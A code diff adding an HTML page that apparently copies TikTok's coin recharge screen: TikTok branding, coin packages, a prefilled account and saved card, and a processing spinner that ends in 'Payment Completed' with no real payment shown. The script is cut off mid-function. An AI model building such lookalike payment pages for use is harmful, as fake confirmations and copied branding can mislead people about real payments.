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" width="40" height="40"></div>
+            <div class="sidebar-icon" title="Bookmark"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24" class="bookmark-icon-de1Xe7"><path fill="#000" d="M6.436 3h9.256v1.91H6.436a.48.48 0 0 0-.487.477v13.65l4.31-3.43a2.475 2.475 0 0 1 3.072 0l4.31 3.43v-5.535h1.949v7.542c0 .803-.952 1.247-1.589.74l-5.899-4.696a.495.495 0 0 0-.614 0l-5.9 4.696c-.636.507-1.588.063-1.588-.74V5.387C4 4.069 5.09 3 6.436 3"></path><path fill="#000" d="M18.128 3a.484.484 0 0 0-.487.477v2.865h-2.923a.484.484 0 0 0-.487.477v.955c0 .262.219.477.487.477h2.923v2.864c0 .263.22.478.487.478h.975a.484.484 0 0 0 .487-.478V8.251h2.923A.484.484 0 0 0 23 7.774v-.955a.484.484 0 0 0-.487-.477H19.59V3.477A.484.484 0 0 0 19.103 3z"></path></svg></div>
+            <div class="sidebar-icon" title="Help"><svg fill="currentColor" class="flip-rtl " color="inherit" font-size="28" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em"><path d="M21.36 28.05V22.8l1.79-.1c2.33-.1 3.87-1.36 3.87-3.31s-1.31-3-3.33-3c-1.95 0-3.53.95-3.88 3.1l-4.31-.7c.54-3.98 3.78-6.28 8.54-6.28 4.5 0 7.66 2.66 7.66 6.75 0 3.3-2.18 5.66-5.58 6.3v2.5h-4.76ZM20.62 32.72a2.99 2.99 0 0 1 3.07-3.04 2.96 2.96 0 0 1 3.04 3.04c0 1.7-1.28 3.01-3.04 3.01a2.98 2.98 0 0 1-3.07-3Z"></path><path d="M2 24a22 22 0 1 1 44 0 22 22 0 0 1-44 0Zm22 18a18 18 0 1 0 0-36 18 18 0 0 0 0 36Z"></path></svg></div>
+        </div>
+    </div>
+
+    <!-- 底部邀请卡片 -->
+    <div class="bottom-invite">
+        <div class="invite-card">
+            <div class="invite-card-content">
+                <img src="./img/icon_invite_rewards.png" alt="sage" height="43" width="56">
+                <div class="invite-card-text">
+                    <h3>Invite & Get Rewards</h3>
+                    <p>Check out this new feature!</p>
+                </div>
+            </div>
+            <span class="arrow-icon">›</span>
+        </div>
+    </div>
+
+    <!-- Add to home screen -->
+    <div class="add-to-home">
+        <div class="add-to-home-content">
+            <div class="add-to-home-icon">
+                <img src="img/home_screen_thumbnail.dee906dc.png" alt="Add to home screen" style="width: 60px; height: 60px; border-radius: 12px;">
+            </div>
+            <div class="add-to-home-text">
+                <h3>Add this page to home screen</h3>
+                <p>for one-tap access</p>
+            </div>
+        </div>
+        <button class="add-btn">Add</button>
+    </div>
+
+    <!-- TikTok Logo -->
+    <div class="tiktok-logo-container">
+        <svg xmlns="http://www.w3.org/2000/svg" width="69" height="16" fill="none" viewBox="0 0 69 16"><path fill="#161823" fill-opacity="0.1" d="M28.207 6.681a1.399 1.399 0 1 0-.001-2.798 1.399 1.399 0 0 0 0 2.798M40.594 3.883h8.879l-.797 2.483h-2.449v9.181999999999999h-2.81V6.364h-2.492l-.33.006zM26.813 7.848v-.253h2.781l.001.253.003 6.968-.007.731H26.83v-.396zM31.047 4.4v-.55h2.75v5.433000000000001l2.781-2.707h3.316l-3.482 3.381 3.9 5.583H37.25l-2.603-3.873-.825.798v3.076l-2.767-.006v-.248zM58.77 4.4v-.55h2.75v.479l.007 4.954 2.775-2.706h3.316l-3.48 3.385 3.906 5.583h-3.061l-2.606-3.873-.824.798v3.076h-2.766v-.248zM48.063 10.818a4.781 4.781 0 1 1 9.197 1.859 4.8 4.8 0 0 1-1.757 2.145 4.77 4.77 0 0 1-2.65.808 4.78 4.78 0 0 1-3.4-1.404 4.8 4.8 0 0 1-1.038-1.564 4.8 4.8 0 0 1-.352-1.844m6.95 0c0-1.292-.89-2.303-2.179-2.3-1.29 0-2.162 1.012-2.162 2.304s.866 2.313 2.162 2.311c1.297 0 2.18-1.028 2.179-2.32zM17.496 3.883h8.674l-.797 2.483H23.12v9.177h-2.8V6.365l-2.822.006zM14.686 3.843c-.981-.03-1.87-.5-2.54-1.128A3.69 3.69 0 0 1 11.006 0H8.276v10.53c0 1.721-1.031 2.734-2.296 2.734a2.3 2.3 0 0 1-1.77-.803 2.3 2.3 0 0 1-.468-.879 2.29 2.29 0 0 1 .318-1.917 2.29 2.29 0 0 1 2.662-.866v-2.78a3.4 3.4 0 0 0-.742-.079 5.025 5.025 0 0 0-4.644 3.104 5.034 5.034 0 0 0 3.661 6.86 5.023 5.023 0 0 0 6.007-4.934V5.302c1.058.733 2.323 1.078 3.674 1.103z"></path></svg>
+    </div>
+
+    <!-- Redeem gift card -->
+    <div class="redeem-card">
+        <span>Redeem gift card</span>
+        <span>›</span>
+    </div>
+
+    <!-- 订单摘要弹窗 -->
+    <div class="modal-overlay" id="orderModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 class="modal-title">Order summary</h2>
+                <button class="modal-close" id="closeModal">✕</button>
+            </div>
+            <div class="modal-body">
+                <!-- 账户信息 -->
+                <div class="order-row account">
+                    <span>Account</span>
+                    <span class="order-value" id="modalAccount">ryanweyers42</span>
+                </div>
+
+                <!-- 硬币数量 -->
+                <div class="order-row coins">
+                    <span id="modalCoins">17,500 Coins</span>
+                    <span class="order-value" id="modalCoinsPrice">$185</span>
+                </div>
+
+                <!-- 总计 -->
+                <div class="order-row total">
+                    <span>Total</span>
+                    <span class="order-value" id="modalTotalPrice">$185</span>
+                </div>
+
+                <!-- 支付方式选择 -->
+                <div class="payment-method-section">
+                    <div class="payment-method-title">Select a payment method</div>
+                    <div class="payment-method-label">Method</div>
+
+                    <!-- 已保存的卡片 -->
+                    <div class="saved-card selected" data-card="visa">
+                        <div class="card-icon">
+                            <img src="./img/visa_acffbd.png" alt="VISA">
+                        </div>
+                        <div class="card-info">
+                            <span class="card-number">************12</span>
+                        </div>
+                        <div class="radio-check"></div>
+                    </div>
+
+                    <!-- 总计显示 -->
+                    <div class="modal-total">
+                        <span class="modal-total-label">Total</span>
+                        <span class="modal-total-amount" id="modalFinalTotal">$ 185</span>
+                    </div>
+
+                    <!-- 支付按钮 -->
+                    <button class="pay-btn" id="payNowBtn">Pay now</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- 支付处理弹窗 -->
+    <div class="payment-processing-modal" id="processingModal">
+        <div class="payment-processing-content">
+            <div class="loading-spinner">
+                <div class="spinner-circle"></div>
+                <div class="spinner-circle"></div>
+            </div>
+            <div class="processing-title">Processing your Payment</div>
+            <div class="processing-message">This could take a few seconds</div>
+        </div>
+    </div>
+
+    <!-- 自定义充值键盘弹窗 -->
+    <div class="custom-keyboard-modal" id="customKeyboardModal">
+        <div class="custom-keyboard-content">
+            <div class="custom-keyboard-header">
+                <div class="custom-keyboard-header-left">
+                    <button class="custom-keyboard-back-btn" id="keyboardBackBtn">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M15 18L9 12L15 6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                        </svg>
+                    </button>
+                </div>
+                <div class="custom-keyboard-title">Custom</div>
+                <button class="custom-keyboard-help-btn">
+                    <span>?</span>
+                </button>
+            </div>
+            
+            <div class="custom-keyboard-body">
+                <div class="keyboard-coin-selector">
+                    <div class="keyboard-coin-label">
+                        <span>Number of Coins</span>
+                        <svg width="12" height="12" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M8 9L4 5L12 5L8 9Z" fill="currentColor"/>
+                        </svg>
+                    </div>
+                    <div class="keyboard-coin-input-wrapper" id="keyboardInputWrapper">
+                        <svg class="keyboard-coin-icon-display" color="inherit" viewBox="0 0 48 48" fill="currentColor" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em"><g clip-path="url(#Icon_Color-Tiktok_Coin_svg__b)"><path d="M48 24a24 24 0 1 1-48 0 24 24 0 0 1 48 0Z" fill="#FFB84D"></path><path d="M47 24a23 23 0 1 1-46 0 23 23 0 0 1 46 0Z" fill="#FFDE55"></path><path d="M42 24a18 18 0 1 1-36 0 18 18 0 0 1 36 0Z" fill="#F7A300"></path><path d="M42 24a18 18 0 1 1-36 0 18 18 0 0 1 36 0Z" fill="#F7A80F"></path><path d="M41.94 25.5a18 18 0 1 0-35.88 0 18 18 0 0 1 35.88 0Z" fill="#E88B00"></path><path d="M41.94 25.5a18 18 0 1 0-35.88 0 18 18 0 0 1 35.88 0Z" fill="#F09207"></path><path d="M34.74 17.77v5.86c-2.06 0-4.05-.44-5.81-1.55v7.2a7.79 7.79 0 0 1-7.84 7.75 7.79 7.79 0 0 1-7.8-8.35 7.79 7.79 0 0 1 9.19-8.24v6c-.47-.13-.9-.26-1.39-.26a3.14 3.14 0 0 0-3.09 2.5 3.14 3.14 0 0 0 3.1 2.5c1.74 0 3.14-1.4 3.14-3.11V12.03h4.69a5.6 5.6 0 0 0 5.81 5.74Z" fill="#F09207"></path><path d="M34.34 18.18a5.78 5.78 0 0 1-5.82-5.74h-3.87v15.63c0 1.94-1.6 3.5-3.56 3.5a3.53 3.53 0 0 1-3.55-3.5 3.53 3.53 0 0 1 4.52-3.38v-3.9a7.38 7.38 0 0 0-8.4 7.28 7.38 7.38 0 0 0 7.43 7.34c4.1 0 7.43-3.29 7.43-7.34v-7.98a9.73 9.73 0 0 0 5.82 1.92v-3.83Z" fill="#fff"></path></g><defs><clipPath id="Icon_Color-Tiktok_Coin_svg__b"><path fill="#fff" d="M0 0h48v48H0z"></path></clipPath></defs></svg>
+                        <input type="text" class="keyboard-coin-input" id="keyboardCoinInput" placeholder="30 - 2,500,000" readonly>
+                    </div>
+                </div>
+                
+                <div class="keyboard-numpad">
+                    <button class="keyboard-key" data-value="1">1</button>
+                    <button class="keyboard-key" data-value="2">2</button>
+                    <button class="keyboard-key" data-value="3">3</button>
+                    <button class="keyboard-key delete-key" data-value="delete">
+                        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M20 5H8L2 12L8 19H20C21.1 19 22 18.1 22 17V7C22 5.9 21.1 5 20 5Z" fill="none" stroke="currentColor" stroke-width="1.5"/>
+                            <path d="M18 9L12 15M12 9L18 15" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/>
+                        </svg>
+                    </button>
+                    <button class="keyboard-key" data-value="4">4</button>
+                    <button class="keyboard-key" data-value="5">5</button>
+                    <button class="keyboard-key" data-value="6">6</button>
+                    <button class="keyboard-key" data-value="000">000</button>
+                    <button class="keyboard-key" data-value="7">7</button>
+                    <button class="keyboard-key" data-value="8">8</button>
+                    <button class="keyboard-key" data-value="9">9</button>
+                    <button class="keyboard-key" data-value="0">0</button>
+                </div>
+                
+                <div class="keyboard-special-offer">
+                    <span class="keyboard-special-offer-label">Special offer</span>
+                    <span class="keyboard-special-offer-value">
+                        Unlock 5% cash back
+                        <svg width="12" height="12" viewBox="0 0 48 48" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M27.76 24 14.59 10.83a1 1 0 0 1 0-1.42L17.4 6.6a1 1 0 0 1 1.42 0l16.35 16.35a1.5 1.5 0 0 1 0 2.12L18.83 41.41a1 1 0 0 1-1.42 0L14.6 38.6a1 1 0 0 1 0-1.42L27.76 24Z"></path>
+                        </svg>
+                    </span>
+                </div>
+                
+                <div class="keyboard-total">
+                    <span class="keyboard-total-label">Total</span>
+                    <span class="keyboard-total-amount" id="keyboardTotalAmount">$0</span>
+                </div>
+                
+                <button class="keyboard-recharge-btn" id="keyboardRechargeBtn" disabled>
+                    <svg class="btn-icon mobile-btn-icon" fill="currentColor" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em"><path d="M28.22 13.7a4.83 4.83 0 0 0 4.86 4.8l-.04 3.45c-1.77 0-3.4-.53-4.75-1.43l-.09 6.99a6.64 6.64 0 0 1-6.69 6.3 6.44 6.44 0 0 1-6.53-6.45 6.63 6.63 0 0 1 7.61-6.4l-.04 3.7a2.97 2.97 0 0 0-3.88 2.7 2.85 2.85 0 0 0 2.89 2.85 2.93 2.93 0 0 0 2.96-2.85l.16-13.66h3.54Z"></path><path d="M5 23.15V10.5c0-1.2 1.06-2.17 2.26-2.28 3.05-.25 8.87-1.52 15.34-6.99.8-.67 2-.67 2.8 0 6.46 5.46 12.28 6.74 15.34 7 1.2.1 2.26 1.07 2.26 2.27v12.65c0 14.13-14.77 21.8-18.27 23.43-.47.22-1 .22-1.47 0C19.76 44.96 5 37.28 5 23.15Zm4-11.1v11.1c0 5.57 2.88 10.04 6.56 13.5 3.1 2.91 6.5 4.86 8.44 5.85a37.07 37.07 0 0 0 8.43-5.85C36.11 33.2 39 28.72 39 23.15V12.04c-3.65-.53-9.1-2.16-15-6.8-5.91 4.64-11.35 6.27-15 6.8Z"></path></svg>
+                    Recharge
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- 支付完成弹窗 -->
+    <div class="payment-completed-modal" id="completedModal">
+        <div class="payment-completed-content">
+            <div class="success-icon">
+                <div class="success-circle">
+                    <div class="success-checkmark"></div>
+                </div>
+            </div>
+            <div class="completed-title">Payment Completed</div>
+            <div class="completed-message">
+                You recharged <span class="coins-info" id="completedCoins">17,500 coins</span> to Client Account.<br>
+                You can use the coins to send virtual gifts.<br><br>
+                Coins will be added shortly
+            </div>
+            <button class="go-back-btn" id="goBackBtn">Go Back</button>
+        </div>
+    </div>
+
+    <script>
+        // 检测是否为移动端
+        function isMobileDevice() {
+            return window.innerWidth <= 640 || /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        }
+
+        // 粘贴按钮功能
+        const pasteBtn = document.getElementById('paste-btn');
+        const usernameInputField = document.getElementById('username-input');
+
+        // 在移动端设置输入框为 readonly 并阻止键盘弹出
+        if (usernameInputField && isMobileDevice()) {
+            usernameInputField.setAttribute('readonly', 'readonly');
+            
+            // 阻止所有可能触发键盘的事件
+            const preventKeyboard = function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                usernameInputField.blur(); // 立即失去焦点
+                return false;
+            };
+            
+            // 添加多个事件监听器以确保 iOS 键盘不会弹出
+            usernameInputField.addEventListener('focus', preventKeyboard, true);
+            usernameInputField.addEventListener('touchstart', preventKeyboard, true);
+            usernameInputField.addEventListener('touchend', preventKeyboard, true);
+            usernameInputField.addEventListener('click', preventKeyboard, true);
+            usernameInputField.addEventListener('mousedown', preventKeyboard, true);
+            
+            // 监听窗口大小变化
+            window.addEventListener('resize', function() {
+                if (isMobileDevice()) {
+                    usernameInputField.setAttribute('readonly', 'readonly');
+                } else {
+                    usernameInputField.removeAttribute('readonly');
+                }
+            });
+        }
+
+        if (pasteBtn && usernameInputField) {
+            pasteBtn.addEventListener('click', async function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                
+                try {
+                    // 使用 Clipboard API 读取剪贴板内容
+                    const text = await navigator.clipboard.readText();
+                    
+                    // 直接设置输入框的值，不触发焦点
+                    usernameInputField.value = text;
+                    
+                    // 在移动端不聚焦输入框，避免触发键盘
+                    if (!isMobileDevice()) {
+                        usernameInputField.focus();
+                    }
+                } catch (err) {
+                    console.error('无法读取剪贴板:', err);
+                    
+                    // 如果 Clipboard API 不可用，尝试其他方法
+                    // 在移动端，可以提示用户手动长按输入框粘贴
+                    if (isMobileDevice()) {
+                        alert('请使用系统的粘贴功能：长按输入框选择"粘贴"');
+                    } else {
+                        // 桌面端使用 execCommand
+                        try {
+                            usernameInputField.focus();
+                            document.execCommand('paste');
+                        } catch (execErr) {
+                            console.error('粘贴失败:', execErr);
+                        }
+                    }
+                }
+            });
+        }
+
+        // 金币选项点击交互
+        const coinOptions = document.querySelectorAll('.coin-option');
+        const totalAmount = document.querySelector('.total-amount');
+        const customOption = document.querySelector('.custom-option');
+        const customInput = document.querySelector('.custom-input');
+        const btnText = document.querySelector('.mobile-btn-text');
+
+        // 汇率：每个金币的价格
+        const COIN_RATE = 0.0103422857142857;
+
+        // 更新按钮价格的函数
+        function updateButtonPrice(price) {
+            if (btnText) {
+                // 直接显示美元价格
+                btnText.setAttribute('data-price', price);
+            }
+        }
+
+        // 初始化按钮价格
+        updateButtonPrice('$0.31');
+
+        coinOptions.forEach(option => {
+            option.addEventListener('click', function() {
+                // 移除所有选中状态
+                coinOptions.forEach(opt => opt.classList.remove('selected'));
+                // 添加当前选中状态
+                this.classList.add('selected');
+                
+                // 如果是Custom选项
+                if (this.classList.contains('custom-option')) {
+                    // 根据设备类型更新placeholder
+                    const keyboardInput = document.getElementById('keyboardCoinInput');
+                    if (keyboardInput) {
+                        if (isMobileDevice()) {
+                            keyboardInput.placeholder = '30 minimum';
+                        } else {
+                            keyboardInput.placeholder = '30 - 2,500,000';
+                        }
+                    }
+                    
+                    // 显示键盘弹窗
+                    const customKeyboardModal = document.getElementById('customKeyboardModal');
+                    customKeyboardModal.classList.add('active');
+                    
+                    // 禁止背景滚动并滚动到顶部
+                    window.scrollTo(0, 0);
+                    document.body.style.overflow = 'hidden';
+                    document.body.style.position = 'fixed';
+                    document.body.style.top = '0';
+                    document.body.style.width = '100%';
+                } else {
+                // 更新总价
+                const price = this.querySelector('.coin-price')?.textContent;
+                if (price) {
+                    totalAmount.textContent = price;
+                    updateButtonPrice(price);
+                    }
+                }
+            });
+        });
+
+        // Custom输入框输入事件
+        customInput.addEventListener('input', function() {
+            const inputValue = this.value;
+            
+            // 如果输入为空，显示$0.00
+            if (!inputValue) {
+                totalAmount.textContent = '$0.00';
+                updateButtonPrice('$0.00');
+                return;
+            }
+            
+            let value = parseInt(inputValue, 10);
+            
+            // 验证是否为有效数字
+            if (isNaN(value)) {
+                totalAmount.textContent = '$0.00';
+                updateButtonPrice('$0.00');
+                return;
+            }
+            
+            // 验证范围（不修改输入框的值，只用于计算）
+            if (value < 30) {
+                value = 30;
+            } else if (value > 2500000) {
+                value = 2500000;
+            }
+            
+            // 计算价格：硬币数量 × 汇率，四舍五入保留两位小数
+            const priceValue = value * COIN_RATE;
+            const price = priceValue.toFixed(2);
+            const priceText = '$' + price;
+            totalAmount.textContent = priceText;
+            updateButtonPrice(priceText);
+        });
+
+        // 阻止Custom输入框的点击事件冒泡
+        customInput.addEventListener('click', function(e) {
+            e.stopPropagation();
+        });
+
+        // 获取弹窗相关元素
+        const orderModal = document.getElementById('orderModal');
+        const closeModal = document.getElementById('closeModal');
+        const payNowBtn = document.getElementById('payNowBtn');
+        const modalCoins = document.getElementById('modalCoins');
+        const modalCoinsPrice = document.getElementById('modalCoinsPrice');
+        const modalTotalPrice = document.getElementById('modalTotalPrice');
+        const modalFinalTotal = document.getElementById('modalFinalTotal');
+        const modalAccount = document.getElementById('modalAccount');
+        const usernameInput = document.querySelector('.username-input');
+
+        // 更新支付按钮文本的函数（手机视口下显示金额）
+        function updatePayButtonText(price) {
+            if (window.innerWidth <= 640) {
+                // 手机视口：显示金额
+                payNowBtn.textContent = 'Pay now - ' + price.replace('$', '$ ');
+            } else {
+                // 桌面视口：只显示 Pay now
+                payNowBtn.textContent = 'Pay now';
+            }
+        }
+
+        // 监听窗口大小变化，更新按钮文本
+        let currentPrice = '$ 185'; // 默认价格
+        window.addEventListener('resize', function() {
+            updatePayButtonText(currentPrice);
+        });
+
+        // 充值按钮点击 - 显示弹窗
+        document.querySelector('.recharge-btn').addEventListener('click', function() {
+            // 获取用户名输入框的内容
+            const username = usernameInput.value.trim();
+            if (username) {
+                modalAccount.textContent = username;
+            } else {
+                modalAccount.textContent = 'user2044933...'; // 默认用户名
+            }
+
+            // 获取当前选中的金币数量和价格
+            const selectedOption = document.querySelector('.coin-option.selected');
+            
+            let coins = '30';
